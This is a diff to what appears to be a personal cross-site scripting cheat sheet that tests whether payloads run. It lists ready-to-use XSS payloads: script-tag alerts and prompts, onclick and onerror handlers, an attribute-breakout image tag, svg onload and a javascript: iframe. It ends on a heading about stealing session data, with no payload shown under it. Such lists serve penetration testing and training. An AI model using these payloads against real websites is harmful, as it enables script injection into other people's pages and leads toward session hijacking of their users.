@@ -3,9 +3,9 @@
 
 [+] Test if Payload is working
 
-+ First step to check for XSS
-1. <script>alert('SudoHopeX')</script>
-2. <script>alert(1)</script>
++ First step to check for xss
+<script>alert(1)</script>
+<script>alert`1`</script>
 
 + When alert(1) is blocked
 <script>prompt('XSS')</script>
@@ -14,13 +14,20 @@
 <script>console.log('XSS')</script>
 
 + when <script> tag is not working, then use it within an html element
+
 onclick="alert(1)"
+
 <a href="#" onclick="alert(1)">Click Me!</a>
+
 <a onclick="alert(1)">Click Me!</a>
+
 onerror=alert(1) <- adding an element with false link and generating alert in error
+
 "><img src=x onerror=alert(1)>
+
 <img src="x" onerror="alert('XSS')">
 <svg onload="alert('XSS')">
+
 <iframe src="javascript:alert('XSS')"></iframe>
 
 + See (steal) session data.
